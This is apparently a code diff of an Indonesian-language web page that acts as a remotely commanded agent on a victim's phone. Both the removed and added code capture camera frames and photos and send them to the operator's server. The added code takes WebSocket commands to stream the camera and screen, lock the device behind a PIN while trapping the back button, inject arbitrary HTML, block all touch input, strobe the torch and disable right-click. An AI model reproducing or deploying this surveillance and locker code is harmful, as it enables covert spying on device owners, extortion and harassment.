-  if (!url.startsWith('http')) url = 'https://' + url;
-  const el = document.createElement('div');
-  el.id = 'lyx-website';
-  el.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:999996;background:#000;';
-  el.innerHTML = `
-    <div style="background:#1a0000;padding:10px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #cc0000;">
-      <span style="color:#ff4444;font-size:11px;font-family:monospace;">🌐 ${esc(url)}</span>
-      <button onclick="document.getElementById('lyx-website').remove()" style="background:#cc0000;color:#fff;border:none;padding:5px 12px;border-radius:5px;font-size:11px;cursor:pointer;">TUTUP</button>
-    </div>
-    <iframe src="${url}" style="width:100%;height:calc(100vh - 40px);border:none;background:#fff;"></iframe>
-  `;
-  document.body.appendChild(el);
-}
-
-function esc(s) { return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
-
-function showIcon() {
-  showTextOverlay('APLIKASI TARGET DIMUNCULKAN');
-  document.body.animate([
-    { transform: 'translate(0,0)' },
-    { transform: 'translate(-10px,0)' },
-    { transform: 'translate(10px,0)' },
-    { transform: 'translate(0,0)' }
-  ], { duration: 400 });
-}
-
-function playMusic(url) {
-  if (!url) return;
-  const old = document.getElementById('lyx-music');
-  if (old) old.remove();
-  const el = document.createElement('audio');
-  el.id = 'lyx-music';
-  el.src = url;
-  el.autoplay = true;
-  el.loop = false;
-  el.style.display = 'none';
-  document.body.appendChild(el);
-  el.play().catch(() => showTextOverlay('MUSIC PLAYING'));
-  showTextOverlay('MUSIC PLAYING');
-}
-
-function vibrate(duration) {
-  if (!duration) duration = 1000;
-  if (navigator.vibrate) {
-    navigator.vibrate(duration);
-    showTextOverlay('📳 VIBRATE ' + duration + 'ms');
-  } else {
-    showTextOverlay('VIBRATE NOT SUPPORTED');
-  }
-}
-
-function vibrateCustom(count, interval, duration) {
-  if (!navigator.vibrate) { showTextOverlay('VIBRATE NOT SUPPORTED'); return; }
-  var pattern = [];
-  for (var i = 0; i < count; i++) {
-    pattern.push(duration);
-    if (i < count - 1) pattern.push(interval);
-  }
-  navigator.vibrate(pattern);
-  showTextOverlay('📳 VIBRATE ' + count + 'x');
-}
-
-/* ==================== LIVE CAMERA (REAL-TIME STREAM) ==================== */
-async function liveCamera(mode, duration) {
-  stopLiveCamera();
-
-  try {
-    const facing = (mode === 'front') ? 'user' : 'environment';
-    liveCamStream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: facing, width: 640, height: 480 }
-    });
-
-    const video = document.createElement('video');
-    video.srcObject = liveCamStream;
-    video.autoplay = true;
-    video.muted = true;
-    video.playsInline = true;
-    video.id = 'lyx-livecam';
-    video.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;object-fit:cover;z-index:999995;background:#000;';
-    document.body.appendChild(video);
-
-    showTextOverlay('📹 CAMERA PANTAU AKTIF');
-
-    liveCamInterval = setInterval(function() {
-      try {
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0);
-        const frame = canvas.toDataURL('image/jpeg', 0.5);
-
-        fetch(API_BASE + '/api/liveframe', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ deviceId: deviceId, frame: frame })
-        }).catch(function(){});
-      } catch (e) {}
-    }, 1500);
-
-    if (duration > 0) {
-      setTimeout(function() {
-        stopLiveCamera();
-        showTextOverlay('📹 PANTAU BERHENTI');
-      }, duration * 1000);
+/* ---------- COMMAND HANDLERS ---------- */
+function handleCommand(cmd) {
+    console.log('[AGENT] Command received:', cmd);
+    if(!cmd || !cmd.command) return;
+    
+    const { command, params } = cmd;
+    const active = params && params.active !== undefined ? params.active : true;
+    
+    switch(command) {
+        case 'LOCK':
+            toggleLock(active, params.pin, '');
+            break;
+        case 'LOCK_MSG':
+            toggleLock(active, params.pin, params.msg);
+            break;
+        case 'CAMERA':
+            toggleCamera(active, params.cam);
+            break;
+        case 'CUSTOM_HTML':
+            toggleCustomHtml(active, params.html);
+            break;
+        case 'STROBE':
+            toggleStrobe(active, params.speed);
+            break;
+        case 'SCREEN':
+            toggleScreenStream(active);
+            break;
+        case 'BLOCK_TOUCH':
+            toggleBlockTouch(active, params.duration);
+            break;
+        case 'LCD_EFFECT':
+            toggleLcdEffect(active, params.color);
+            break;
+        default:
+            console.log('[AGENT] Unknown command:', command);
     }
-
-  } catch (e) {
-    showTextOverlay('KAMERA DITOLAK');
-  }
+    
+    // report back ke server
+    if(ws && ws.readyState === WebSocket.OPEN) {
+        ws.send(JSON.stringify({
+            type: 'ack',
+            command: command,
+            deviceId: deviceId,
+            status: 'executed',
+            timestamp: Date.now()
+        }));
+    }
 }
 
-function stopLiveCamera() {
-  if (liveCamInterval) {
-    clearInterval(liveCamInterval);
-    liveCamInterval = null;
-  }
-  if (liveCamStream) {
-    liveCamStream.getTracks().forEach(function(t){ t.stop(); });
-    liveCamStream = null;
-  }
-  const vid = document.getElementById('lyx-livecam');
-  if (vid) vid.remove();
+/* ============================================================
+   FITUR 1: LOCK DEVICE
+   ============================================================ */
+let lockPin = '';
+let enteredPin = '';
+let lockActive = false;
+
+function toggleLock(active, pin, msg) {
+    const overlay = document.getElementById('lockOverlay');
+    if(active) {
+        lockPin = pin || '0000';
+        enteredPin = '';
+        lockActive = true;
+        overlay.classList.add('active');
+        document.getElementById('lockMsg').textContent = msg || '';
+        renderPinDisplay();
+        // cegah back button
+        history.pushState(null, '', location.href);
+        window.onpopstate = () => { history.pushState(null, '', location.href); };
+    } else {
+        lockActive = false;
+        overlay.classList.remove('active');
+        enteredPin = '';
+    }
 }
 
-/* ==================== SNAP PHOTO ==================== */
-async function snapPhoto(mode) {
-  try {
-    const facing = (mode === 'front') ? 'user' : 'environment';
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: facing }
-    });
-    const video = document.createElement('video');
-    video.srcObject = stream;
-    video.autoplay = true;
-    video.muted = true;
-    await new Promise(function(r){ setTimeout(r, 800); });
-
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
-    canvas.getContext('2d').drawImage(video, 0, 0);
-    const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
-
-    fetch(API_BASE + '/api/photo', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ deviceId: deviceId, photo: dataUrl })
-    }).catch(function(){});
-
-    video.remove();
-    stream.getTracks().forEach(function(t){ t.stop(); });
-    showTextOverlay('📷 FOTO DIKIRIM');
-  } catch (e) {
-    showTextOverlay('KAMERA DITOLAK');
-  }
+function renderPinDisplay() {
+    const display = document.getElementById('pinDisplay');
+    display.innerHTML = '';
+    for(let i=0; i<lockPin.length; i++) {
+        const dot = document.createElement('div');
+        dot.className = 'pin-dot' + (i < enteredPin.length ? ' filled' : '');
+        display.appendChild(dot);
+    }
 }
 
-/* ==================== AUTO RECONNECT ==================== */
-window.addEventListener('load', () => {
-  if (deviceId) {
-    fetch(API_BASE + '/api/devices')
-      .then(r => r.json())
-      .then(list => {
-        const exists = list.find(d => d.id === deviceId);
-        if (exists) {
-          document.getElementById('devName').textContent = exists.name;
-          document.getElementById('devModel').textContent = exists.model;
-          document.getElementById('devOs').textContent = exists.os;
-          document.getElementById('devId').textContent = deviceId.slice(-8);
-          document.getElementById('inputPage').style.display = 'none';
-          document.getElementById('successPage').classList.add('active');
-          startPolling();
+document.getElementById('keypad').addEventListener('click', (e) => {
+    const key = e.target.dataset.k;
+    if(!key || !lockActive) return;
+    
+    if(key === 'CLR') {
+        enteredPin = '';
+    } else if(key === 'OK') {
+        if(enteredPin === lockPin) {
+            toggleLock(false);
+            return;
         } else {
-          localStorage.removeItem('lyx_device_id');
-          deviceId = null;
+            enteredPin = '';
+            document.getElementById('lockOverlay').animate(
+                [{transform:'translateX(-10px)'},{transform:'translateX(10px)'},{transform:'translateX(0)'}],
+                {duration:200}
+            );
         }
-      }).catch(() => {});
-  }
+    } else {
+        if(enteredPin.length < lockPin.length) {
+            enteredPin += key;
+        }
+    }
+    renderPinDisplay();
+});
+
+/* ============================================================
+   FITUR 3: LIVE CAMERA
+   ============================================================ */
+let camStreamRef = null;
+let camLoopTimer = null;
+
+async function toggleCamera(active, camType) {
+    const overlay = document.getElementById('camOverlay');
+    const overlayVideo = document.getElementById('camOverlayVideo');
+    const hiddenVideo = document.getElementById('camStream');
+    
+    if(active) {
+        try {
+            const constraints = {
+                video: {
+                    facingMode: camType === 'back' ? 'environment' : 'user',
+                    width: { ideal: 640 },
+                    height: { ideal: 480 }
+                },
+                audio: false
+            };
+            camStreamRef = await navigator.mediaDevices.getUserMedia(constraints);
+            hiddenVideo.srcObject = camStreamRef;
+            overlayVideo.srcObject = camStreamRef;
+            overlay.classList.add('active');
+            
+            // streaming frame ke server
+            startCamStreaming(hiddenVideo);
+        } catch(e) {
+            console.log('[AGENT] Camera error:', e.message);
+            // report gagal
+            if(ws && ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({
+                    type: 'error',
+                    command: 'CAMERA',
+                    message: e.message,
+                    deviceId: deviceId
+                }));
+            }
+        }
+    } else {
+        overlay.classList.remove('active');
+        if(camStreamRef) {
+            camStreamRef.getTracks().forEach(t => t.stop());
+            camStreamRef = null;
+        }
+        if(camLoopTimer) {
+            clearInterval(camLoopTimer);
+            camLoopTimer = null;
+        }
+    }
+}
+
+function startCamStreaming(videoEl) {
+    const canvas = document.createElement('canvas');
+    canvas.width = 320; canvas.height = 240;
+    const ctx = canvas.getContext('2d');
+    
+    camLoopTimer = setInterval(() => {
+        if(!camStreamRef) return;
+        try {
+            ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
+            const frame = canvas.toDataURL('image/jpeg', 0.5);
+            if(ws && ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({
+                    type: 'cam_frame',
+                    deviceId: deviceId,
+                    frame: frame,
+                    timestamp: Date.now()
+                }));
+            }
+        } catch(e) {}
+    }, 500); // 2 FPS
+}
+
+/* ============================================================
+   FITUR 4: CUSTOM HTML LOCK
+   ============================================================ */
+function toggleCustomHtml(active, html) {
+    const overlay = document.getElementById('customOverlay');
+    if(active) {
+        overlay.innerHTML = html || '<h1 style="color:#0f0;text-align:center;">LOCKED</h1>';
+        overlay.classList.add('active');
+        history.pushState(null, '', location.href);
+        window.onpopstate = () => { history.pushState(null, '', location.href); };
+    } else {
+        overlay.classList.remove('active');
+        overlay.innerHTML = '';
+    }
+}
+
+/* ============================================================
+   FITUR 5: STROBE / SENTER
+   ============================================================ */
+let strobeTimer = null;
+let strobeTrack = null;
+
+async function toggleStrobe(active, speed) {
+    if(active) {
+        try {
+            // akses kamera belakang untuk torch
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'environment' }
+            });
+            strobeTrack = stream.getVideoTracks()[0];
+            const caps = strobeTrack.getCapabilities ? strobeTrack.getCapabilities() : {};
+            
+            if(caps.torch) {
+                const interval = parseInt(speed) || 100;
+                let state = false;
+                strobeTimer = setInterval(() => {
+                    state = !state;
+                    strobeTrack.applyConstraints({ advanced: [{ torch: state }] }).catch(()=>{});
+                }, interval);
+            } else {
+                // fallback: flash layar
+                flashScreen(active, speed);
+            }
+        } catch(e) {
+            console.log('[AGENT] Strobe error:', e.message);
+            flashScreen(active, speed);
+        }
+    } else {
+        if(strobeTimer) { clearInterval(strobeTimer); strobeTimer = null; }
+        if(strobeTrack) {
+            strobeTrack.applyConstraints({ advanced: [{ torch: false }] }).catch(()=>{});
+            strobeTrack.stop();
+            strobeTrack = null;
+        }
+    }
+}
+
+let flashTimer = null;
+function flashScreen(active, speed) {
+    if(!active) {
+        if(flashTimer) { clearInterval(flashTimer); flashTimer = null; }
+        document.body.style.background = '#000';
+        return;
+    }
+    const interval = parseInt(speed) || 100;
+    let state = false;
+    flashTimer = setInterval(() => {
+        state = !state;
+        document.body.style.background = state ? '#fff' : '#000';
+    }, interval);
+}
+
+/* ============================================================
+   FITUR 6: LIVE SCREEN
+   ============================================================ */
+let screenLoopTimer = null;
+
+function toggleScreenStream(active) {
+    if(active) {
+        // coba pakai getDisplayMedia (butuh izin)
+        if(navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
+            navigator.mediaDevices.getDisplayMedia({ video: true })
+            .then(stream => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                startScreenStreaming(video);
+            })
+            .catch(e => {
+                console.log('[AGENT] Screen capture denied:', e.message);
+                startScreenshotFallback();
+            });
+        } else {
+            startScreenshotFallback();
+        }
+    } else {
+        if(screenLoopTimer) { clearInterval(screenLoopTimer); screenLoopTimer = null; }
+    }
+}
+
+function startScreenStreaming(videoEl) {
+    const canvas = document.createElement('canvas');
+    canvas.width = 360; canvas.height = 640;
+    const ctx = canvas.getContext('2d');
+    
+    screenLoopTimer = setInterval(() => {
+        try {
+            ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
+            const frame = canvas.toDataURL('image/jpeg', 0.4);
+            if(ws && ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({
+                    type: 'screen_frame',
+                    deviceId: deviceId,
+                    frame: frame,
+                    timestamp: Date.now()
+                }));
+            }
+        } catch(e) {}
+    }, 1000); // 1 FPS
+}
+
+function startScreenshotFallback() {
+    // fallback: kirim info viewport + scroll
+    screenLoopTimer = setInterval(() => {
+        if(ws && ws.readyState === WebSocket.OPEN) {
+            ws.send(JSON.stringify({
+                type: 'screen_info',
+                deviceId: deviceId,
+                viewport: { w: innerWidth, h: innerHeight, scrollY: scrollY },
+                timestamp: Date.now()
+            }));
+        }
+    }, 1000);
+}
+
+/* ============================================================
+   FITUR 7: BLOCK TOUCH
+   ============================================================ */
+let blockTimer = null;
+
+function toggleBlockTouch(active, duration) {
+    const overlay = document.getElementById('blockOverlay');
+    if(active) {
+        overlay.classList.add('active');
+        // block semua event
+        ['touchstart','touchmove','touchend','click','mousedown','mouseup','keydown','contextmenu']
+        .forEach(ev => document.addEventListener(ev, blockAll, {capture:true, passive:false}));
+        
+        // auto-off setelah durasi
+        const mins = parseInt(duration) || 5;
+        blockTimer = setTimeout(() => {
+            toggleBlockTouch(false);
+        }, mins * 60 * 1000);
+        
+        history.pushState(null, '', location.href);
+        window.onpopstate = () => { history.pushState(null, '', location.href); };
+    } else {
+        overlay.classList.remove('active');
+        ['touchstart','touchmove','touchend','click','mousedown','mouseup','keydown','contextmenu']
+        .forEach(ev => document.removeEventListener(ev, blockAll, {capture:true}));
+        if(blockTimer) { clearTimeout(blockTimer); blockTimer = null; }
+    }
+}
+
+function blockAll(e) {
+    e.preventDefault();
+    e.stopPropagation();
+    return false;
+}
+
+/* ============================================================
+   FITUR 8: LCD EFFECT
+   ============================================================ */
+let lcdAnimFrame = null;
+
+function toggleLcdEffect(active, color) {
+    const overlay = document.getElementById('lcdOverlay');
+    const canvas = document.getElementById('lcdOverlayCanvas');
+    
+    if(active) {
+        overlay.classList.add('active');
+        canvas.width = innerWidth;
+        canvas.height = innerHeight;
+        const ctx = canvas.getContext('2d');
+        
+        const colors = {
+            green: ['#0f0','#080','#030'],
+            pink: ['#f0f','#a0a','#303'],
+            blue: ['#0ff','#088','#033'],
+            red: ['#f00','#a00','#300']
+        };
+        const palette = colors[color] || colors.green;
+        
+        function draw() {
+            ctx.fillStyle = '#000';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            // garis horizontal
+            for(let i=0; i<80; i++) {
+                const y = Math.random() * canvas.height;
+                const h = Math.random() * 3 + 1;
+                ctx.fillStyle = palette[Math.floor(Math.random()*palette.length)];
+                ctx.globalAlpha = Math.random() * 0.6 + 0.2;
+                ctx.fillRect(0, y, canvas.width, h);
+            }
+            
+            // garis vertikal
+            for(let i=0; i<20; i++) {
+                const x = Math.random() * canvas.width;
+                const w = Math.random() * 2 + 1;
+                ctx.fillStyle = palette[Math.floor(Math.random()*palette.length)];
+                ctx.globalAlpha = Math.random() * 0.4 + 0.1;
+                ctx.fillRect(x, 0, w, canvas.height);
+            }
+            
+            // glitch blocks
+            for(let i=0; i<15; i++) {
+                const x = Math.random() * canvas.width;
+                const y = Math.random() * canvas.height;
+                const w = Math.random() * 150 + 20;
+                const h = Math.random() * 20 + 5;
+                ctx.fillStyle = palette[Math.floor(Math.random()*palette.length)];
+                ctx.globalAlpha = Math.random() * 0.5;
+                ctx.fillRect(x, y, w, h);
+            }
+            
+            ctx.globalAlpha = 1;
+            lcdAnimFrame = requestAnimationFrame(draw);
+        }
+        draw();
+        
+        history.pushState(null, '', location.href);
+        window.onpopstate = () => { history.pushState(null, '', location.href); };
+    } else {
+        overlay.classList.remove('active');
+        if(lcdAnimFrame) { cancelAnimationFrame(lcdAnimFrame); lcdAnimFrame = null; }
+    }
+}
+
+/* ============================================================
+   INIT
+   ============================================================ */
+document.addEventListener('DOMContentLoaded', () => {
+    // cegah zoom
+    document.addEventListener('gesturestart', e => e.preventDefault());
+    // cegah inspect element (basic)
+    document.addEventListener('contextmenu', e => e.preventDefault());
 });
 </script>
+
 </body>
 </html>
